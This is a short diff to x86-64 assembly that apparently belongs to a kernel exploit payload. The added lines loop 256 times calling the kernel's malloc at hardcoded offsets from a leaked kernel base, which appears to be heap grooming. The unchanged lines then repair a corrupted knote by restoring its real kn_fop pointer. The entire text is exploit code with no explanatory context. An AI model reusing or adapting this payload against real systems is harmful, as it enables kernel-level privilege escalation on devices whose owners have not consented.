@@ -1,5 +1,21 @@
 use64
 start:
+push rdi
+push rsi
+mov rcx, 256
+.malloc_loop:
+push rcx
+lea r8, [rel start]
+mov rax, [r8+4072] ; kernel_base
+mov rdi, 0xf8
+lea rsi, [rax+0x1540eb0] ; M_TEMP
+mov rdx, 2 ; M_WAITOK
+lea rax, [rax+0xd7a0] ; malloc
+call rax
+pop rcx
+loop .malloc_loop
+pop rsi
+pop rdi
 lea r8, [rel start]
 ; fix knote
 mov rax, [r8+4064] ; real kn_fop
